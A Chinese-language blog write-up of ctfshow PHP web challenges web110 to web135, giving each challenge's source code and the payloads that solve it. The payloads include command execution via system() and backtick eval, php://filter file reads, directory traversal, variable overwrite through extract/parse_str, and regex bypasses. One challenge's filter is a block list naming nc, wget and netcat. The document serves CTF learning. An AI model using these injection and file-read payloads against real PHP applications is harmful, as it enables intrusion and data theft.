+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=Exception&amp;v2=system(<span class="hljs-string">&#x27;tac fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=Error&amp;v2=system(<span class="hljs-string">&#x27;tac fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>根据题目给的hint，先上payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=FilesystemIterator&amp;v2=getcwd<br></code></pre></td></tr></table></figure>
+
+<p>FilesystemIterator：：__construct — 构造一个新的文件系统迭代器</p>
+<p><code>getcwd()</code> 返回当前工作目录, 即 &#x2F;var&#x2F;ww&#x2F;html。类里面刚好有 <code>__toString</code> 可以 echo 输出</p>
+<h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=ctfshow&amp;v2=GLOBALS<br></code></pre></td></tr></table></figure>
+
+<p>进行变量覆盖</p>
+<h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=compress.zlib://flag.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=compress.zlib://flag.php<br></code></pre></td></tr></table></figure>
+
+<p>官p是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p<br>roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro<br>c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/<br>self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se<br>lf/root/proc/self/root/var/www/html/flag.php<br></code></pre></td></tr></table></figure>
+
+<p>这是一个 Linux 环境中的路径表达式，表示通过不断递归访问 <code>/proc/self/root</code> 来尝试访问最终的目标文件 <code>/var/www/html/flag.php</code>。利用函数所能处理的长度限制进行目录溢出,超过is_file能处理的最大长度就不认为是个文件了。</p>
+<h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><h3 id="0x01-10"><a href="#0x01-10" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter//resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-10"><a href="#0x02-10" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=Php://filter/zlib.deflate|zlib.inflate/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=%0c36<br></code></pre></td></tr></table></figure>
+
+<p>利用 PHP 的宽松类型比较特性</p>
+<p>由于 <code>$num</code> 的原始值是 <code>&quot;\x0c36&quot;</code>，它通过了 <code>is_numeric()</code> 检查，且不严格等于 <code>&#39;36&#39;</code>，同时经过 <code>filter()</code> 处理后的值仍为 <code>&#39;36&#39;</code>。</p>
+<h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Firebasky</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">18</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>一开始是想执行fl0g其实是执行不了的，真是可以传值的只有利用fun，执行echo $flag，这里因为php特性改成[,再传给CTF_SHOW，就达成了判断条件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun= <span class="hljs-built_in">echo</span> <span class="hljs-variable">$flag</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><h3 id="0x01-11"><a href="#0x01-11" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun=var_export(get_defined_vars())<br></code></pre></td></tr></table></figure>
+
+<p>无参数绕过常见的一种方法</p>
+<h3 id="0x02-11"><a href="#0x02-11" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun=highlight_file(<span class="hljs-variable">$_GET</span>[1])<br></code></pre></td></tr></table></figure>
+
+<p><code>?1=flag.php</code></p>
+<h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun=include(<span class="hljs-variable">$_GET</span>[1])<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><h3 id="0x01-12"><a href="#0x01-12" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str(<span class="hljs-variable">$a</span>[1])<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a=1+fl0g=flag_give_me<br></code></pre></td></tr></table></figure>
+
+<p><code>?a=1+fl0g=flag_give_me</code>。在之前的代码中存在 <code>parse_str($a[1])</code>，并且 <code>$a[1]</code> 是可控的输入，那么这里的查询字符串会被 <code>parse_str()</code> 函数解析。</p>
+<p> <code>$a[1]</code> 包含 <code>fl0g=flag_give_me</code>，<code>parse_str($a[1])</code> 会将它解析为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$fl0g</span> = <span class="hljs-string">&quot;flag_give_me&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-12"><a href="#0x02-12" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert(<span class="hljs-variable">$a</span>[0])<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-variable">$fl0g</span>=flag_give_me<br></code></pre></td></tr></table></figure>
+
+<h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-10 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-10 21:52:49</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$ctf_show</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br><br><span class="hljs-comment">//特殊字符检测</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;嗯哼？&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf_show</span>===<span class="hljs-string">&#x27;ilove36d&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure>
+
+<h3 id="0x01-13"><a href="#0x01-13" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ctf show=ilove36d<br></code></pre></td></tr></table></figure>
+
+<p>点或空格会被转化为下划线，由于点被过滤 ，所以可以用上空格。</p>
+<h3 id="0x02-13"><a href="#0x02-13" class="headerlink" title="0x02"></a>0x02</h3><p>$_SERVER[‘QUERY_STRING’];获取的查询语句是服务端还没url解码之前的字符串，所以对_进行一次url编码也能绕过。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ctf%5fshow=ilove36d<br></code></pre></td></tr></table></figure>
+
+<h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-10-10 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-12 19:49:05</span><br><br>*/<br><br><br>error_reporting(0);<br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(__FILE__);<br><br><span class="hljs-variable">$f1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br><span class="hljs-variable">$f2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(check(<span class="hljs-variable">$f1</span>))&#123;<br>    var_dump(call_user_func(call_user_func(<span class="hljs-variable">$f1</span>,<span class="hljs-variable">$f2</span>)));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;嗯哼？&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> check(<span class="hljs-variable">$str</span>)&#123;<br>    <span class="hljs-built_in">return</span> !preg_match(<span class="hljs-string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?f1=_&amp;f2=get_defined_vars<br></code></pre></td></tr></table></figure>
+
+<p>本地学到了,php扩展目录下有php_gettext.dll_()是一个函数。</p>
+<p>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展get_defined_vars — 返回由所有已定义变量所组成的数组。</p>
+<p>为了绕过正则，_()函数和gettext()的效果一样，所以可以用_()函数代替gettext()函数。</p>
+<h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><h3 id="0x01-14"><a href="#0x01-14" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?f=php://filter/convert.base64-encode/ctfshow/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-14"><a href="#0x02-14" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?f=/ctfshow/../../../../var/www/html/flag.php<br></code></pre></td></tr></table></figure>
+
+<p>进行目录穿越</p>
+<h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-13 05:19:40</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x01-15"><a href="#0x01-15" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f=ctfshow<br></code></pre></td></tr></table></figure>
+
+<p>+表示必须匹配1次或多次，+?表示 重复1次或更多次，但尽可能少重复,所以在ctfshow前面必须有至少一个字符，才会返回true</p>
+<h3 id="0x02-15"><a href="#0x02-15" class="headerlink" title="0x02"></a>0x02</h3><p>PHP利用PCRE回溯次数限制绕过,前面加个100w个a就行</p>
+<h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>PHP利用PCRE回溯次数限制绕过,前面加个100w个a就行</p>
+<h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>进去是一个网站，默认看一下robots.txt，告诉&#x2F;admin,进去得到网页</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=admin&amp;password=1&amp;username=admin<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> === <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x36D</span>) &amp;&amp; <span class="hljs-variable">$password</span> === <span class="hljs-variable">$flag</span> || <span class="hljs-variable">$username</span> ===<span class="hljs-string">&quot;admin&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>先运行<code>&amp;&amp;</code>再运行<code>||</code>，a||b如果前面的错了那么就运行后面的，如果前面对的就不看后面的了</p>
+<h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: Firebasky</span><br><span class="hljs-comment"># @Date:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-13 16:43:44</span><br><br>*/<br><br>error_reporting(0);<br>highlight_file(__FILE__);<br>//flag.php<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$F</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;F&#x27;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="hljs-variable">$F</span>))&#123;<br>        <span class="hljs-built_in">eval</span>(substr(<span class="hljs-variable">$F</span>,0,6));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        die(<span class="hljs-string">&quot;6个字母都还不够呀?!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>原理大致就是利用curl外带，然后dnslog进行，直接贴文章吧</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/109095382">ctfshow web133和其他命令执行的骚操作-CSDN博客</a></p>
+<h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Firebasky</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-14 23:01:06</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonononono&quot;</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> == <span class="hljs-string">&#x27;36d&#x27;</span> &amp;&amp; <span class="hljs-variable">$key2</span> == <span class="hljs-string">&#x27;36d&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?_POST[key1]=36d&amp;_POST[key2]=36d<br></code></pre></td></tr></table></figure>
+
+<p>利用变量覆盖，执行</p>
+<h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?F=`<span class="hljs-variable">$F</span>`+;<span class="hljs-built_in">cp</span>+flag.php+1.txt<br></code></pre></td></tr></table></figure>
+
+<p>自身的值在被eval时候直接引用自身，可以用cp把flag复制到1.txt访问 <code>?F=</code>$F<code>+;cp+flag.php+1.txt</code></p>
